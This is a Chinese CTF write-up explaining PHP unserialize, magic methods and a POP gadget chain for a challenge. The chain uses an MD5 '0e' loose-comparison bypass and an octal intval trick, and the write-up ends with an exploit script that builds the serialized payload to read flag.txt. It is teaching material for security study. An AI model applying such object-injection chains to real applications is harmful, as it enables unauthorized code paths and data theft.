## 魔王的宝藏

这道题就是考了php反序列化的最基础的用法以及一些之前兴趣小组讲过的php小特性，难度不大但需要对反序列化的魔术方法都有所了解。

在代码的最下方

```
if (isset($_POST["Brave"])) {
    unserialize($_POST["Brave"]);
}
```

表示了当我们post传参brave时，就会调用unserialize这个函数，学习后可以知道这是php的反序列化函数，当调用他时，就会读取序列化字符串，还原存储的对象。

这里引入序列化和反序列化的概念

#### 序列化

序列化函数：`serialize()` 

序列化目的：**把对象转化为可存储的字符串形式，用于持久存储或传输对象**

```php
<?php
class r00t {
    public $members;

    function __construct() {
        $this->web = ["festu", "vv", "jcy"];
    }
}

$team = new r00t();
$ser_team = serialize($team);
var_dump($ser_team);

// string(74) "O:4:"r00t":1:{s:3:"web";a:3:{i:0;s:5:"festu";i:1;s:2:"vv";i:2;s:3:"jcy";}}"
```

分析序列化字符串：

```php
O:4:"r00t":1:{}
- 表示序列化了一个对象(Object)，对象名称长度为4，内容为r00t，有1个成员属性。
    
S:3:"web";a:3:{}
- 表示第1个成员属性的键是字符串(string)，长度为3，内容为web；键对应的值是一个数组(array)，数组有三个元素
    
i:0;s:5:"festu";
- 数组的第1个元素键为整型(integer)，内容为0；值的类型为字符串，长度为5，内容为festu
    
i:1;s:2:"vv";
i:2;s:3:"jcy";    
- 与上面类似
```

序列化不存储类中定义的函数。

#### 反序列化

反序列化函数：`unserialize()`

反序列化目的：读取序列化字符串，还原存储的对象。

```php
<?php
class r00t {
    public $web;
}

$ser_team = 'O:4:"r00t":1:{s:3:"web";a:3:{i:0;s:5:"festu";i:1;s:2:"vv";i:2;s:3:"jcy";}}'; 
$unser_team = unserialize($ser_team);
var_dump($unser_team);

// object(r00t)#1 (1) { ["web"]=> array(3) { [0]=> string(5) "festu" [1]=> string(2) "vv" [2]=> string(3) "jcy" } }
```

也就是说我们需要传入一个形如O:4:"r00t":1:{s:3:"web";a:3:{i:0;s:5:"festu";i:1;s:2:"vv";i:2;s:3:"jcy";}}的数据，让服务器反序列化并执行一系列操作

这里就需要提到php中的**魔术方法**

#### 魔术方法

php 的对象有一些特殊的方法，会在对象执行特定操作时自动调用：

```php
__construct() // 构造函数时
__destruct() // 析构函数时
__wakeup() // 执行unserialize()时
__sleep() // 执行serialize()时
__toString() // 对象被当作字符串处理时
__invoke() // 对象被当作函数调用时
__get()//从不可访问的属性中读取数据，或者说是调用一个类及其父类方法中未定义属性时
__set()//当给一个未定义的属性赋值时，或者修改一个不能被修改的属性时(`private protected`)
__call() //在对象上下文中调用不可访问的方法时触发
```

#### 解题步骤

在这道题目中上述函数除了destruct和sleep没有用到以外，其他都用到了

对于一般的反序列化题目，我们可以采用逆推的方法，也就是先看最后得到flag的方法，再倒着推这个方法的调用过程

比如这道题的核心目标就是最终让 Reward::__invoke 被调用，从而读取 `flag.txt`

```
class Reward
{
    public function __invoke(){
        $flag=file_get_contents('flag.txt');
        echo"年轻的勇者，你凭借勇气和智慧战胜了魔王，这是你的奖励！$flag";
    }
}
```

前面我们知道__invoke()这个魔术方法只有在「对象被当成函数调用」时才会触发

所以我们需要代码里谁把对象当成了函数调用 

在 Treasure 中：

```
 public function __call($name,$arg){
       if(isset($arg[0]) &&$arg[0]!=2025&&intval($arg[0],0)==2025){
        echo "结束了？宝藏在哪？<br>";
        $reward=$this->reward;
        $reward();
```

如果reward定义为了一个类，那么 `$reward();`就将reward这个类作为了函数调用，也就能够使得`__invoke `触发,而要调用reward，就必须调用`__call`函数

在前面知道被调用的是一个不存在的方法，才会走到 __call。

在Demon这个类中

```
class Demon
{
    public $result;
    public $end;

    public function __toString(){
    
        echo "到此为止了！魔王<br>";
            $this->result->end($this->end);
            return "<br>";
        } 
}
```

如果把result设定为一个类，那么他调用的这个end方法必须是原来类中不存在的，这样就可以触发call函数，所以result应该设置为Treasure类的实例，而进入call函数后还需要满足if条件成立，也就是需要满足:

- `isset($arg[0])`
- `$arg[0] != 2025`
- `intval($arg[0], 0) == 2025`

触发 __call('end', [$this->end])后，end被当成arg参数传入，这里的条件就是说end不能弱等于2025，但是intval转换后需要弱等于2025，这里就需要用到intval函数的一条特性

![image-20251123181742133](image-20251123181742133.png)

所以当我们使得end为一个八进制字符串时，十进制转换后就能弱等于2025

八进制字符串'03751'转换为十进制正好是2025

现在就需要知道Demon类中的__tostring方法是怎么调用的

我们知道当对象被当作字符串处理时，会调用__tostring方法

在Elf的`__get `里有一个

echo $this->go

也就是说go应该是一个字符串，那么如果我们令go为Demon这个类，也就实现了将Demon作为字符串调用

```
class Elf
{
    public $go;
    private $power = [];

    public function __set($name,$value)
    {
        $this->power[$name] = $value;
    }

    public function __get($name)
    {
        if ($this->power['staff'] !== $this->power['magic_book']
            && md5($this->power['staff']) == $this->power['magic_book']) {
            echo "沉睡的精灵被你唤醒了，是时候去讨伐魔王了！<br>";
            echo $this->go;   // go 是 Demon 对象时触发 Demon::__toString
        } else {
            echo "看来你的实力还没有得到精灵的认可。";
        }
    }
}
```

而这个条件要成立：__get必须被调用

前面我们知道访问不存在的属性时会调用__get方法

而在Start类中return $this->adventure->elf;

如果令adventure成为一个类，而这个类中又没有elf这个属性，那么就会调用__get方法

而在__get方法中又存在if判定

需要满足：

- `$power['staff'] !== $power['magic_book']`
- `md5($power['staff']) == $power['magic_book']`

这个也就是兴趣小组上讲到的关于md5的若比较绕过，我们只需要使得两个值的md5值相等或都为0exxxxx即可

比如：

`$power['staff'] = '240610708';`

`$power['magic_book'] = '0e462097431906509019562988736854';`
其中：`md5('240610708') == '0e462097431906509019562988736854'`。

然而现在的问题是怎么设置`$power['staff']和$power['magic_book']`的值

我们注意到power是一个数组，并且是私有属性，那么我们没办法对他的值直接进行设置

但是可以看到这个set函数可以设置power数组内的元素的值

```
 public function __set($name,$value)
    {
        $this->power[$name] = $value;
    }
```

我们知道__set()会在修改一个不存在的属性时触发，在Start类中的wakeup方法里

```
public function __wakeup(){

        if (strpos($this->isbrave, "brave") !== false && $this->isbrave !== "brave") {
            echo "<br>年轻的勇者啊 ，精灵魔法师就在前面等你！<br>";
            $this->adventure->staff=$this->skill1;
            $this->adventure->magic_book=$this->skill2;
            return $this->adventure->elf;
        }
        else{
            echo "看来你还没有做好出发的准备啊。<br>";
        }
    }
```

直接将skill1和skill2的值赋给staff和magic_book，然而Elf类中并不直接具有staff和magic_book，所以就会调用set函数进行赋值，于是我们只需要使得

`skill1 = '240610708';`

`skill2 = '0e462097431906509019562988736854';`

即可对power数组中添加`$power['staff'])` ` $power['magic_book']`的值

wakeup方法中还存在一个简单的条件判断，就是isbrave不能和brave相等但是必须包含brave

我们设置为brave123即可

现在完事具备，只要反序列化调用了我们的序列化数据，就会触发wakeup函数从而进行一系列操作。



**完整利用链梳理：**

1. 
   Start对象

   - isbrave = 'brave123' → 触发 __wakeup分支
   - skill1 / skill2设置为 MD5 魔术值 → 满足 Elf::__get 条件

2. 嵌套对象关系：

   adventure = new Elf() → 让 Start::__wakeup 对 Elf 操作

   adventure->go = new Demon()→ 让 Elf::get 里 `echo $this->go;`触发__ Demon::__toString


   Demon::toString 中的` $this->result->end($this->end)`- >Treasure::call

   adventure->go->end = '03751' → 作为 Treasure::__call 的参数，满足八进制转十进制等于 2025 的条件

   reward设为 new Reward()最终在 Treasure::call中 $reward();调用 Reward::__invoke 读 flag

而 exp 做的事情，就是在序列化前把这条链上的每个关键属性：

- `isbrave / skill1 / skill2`
- `adventure = Elf`
- `adventure->go = Demon`
- `adventure->go->result = Treasure`
- `adventure->go->end = '03751'`
- `Treasure->reward = Reward`

全部布好，从而一旦反序列化，就会顺着这条路径，依次触发到 Reward::__invoke 拿 flag。

exp

```
<?php
class Start {
    public $isbrave;
    public $adventure;
    public $skill1;
    public $skill2;
}

class Elf {
    public $go;
}

class Demon {
    public $result;
    public $end;
}

class Treasure {
    public $reward;
    
    public function __construct() {
        $this->reward = new Reward();
    }
}

class Reward {
}

$start = new Start();
$start->isbrave = 'brave123';
$start->skill1='240610708';
$start->skill2='0e462097431906509019562988736854';
$start->adventure = new Elf();
$start->adventure->go = new Demon();
$start->adventure->go->result=new Treasure();
$start->adventure->go->end='03751';
echo serialize($start);
?>
```


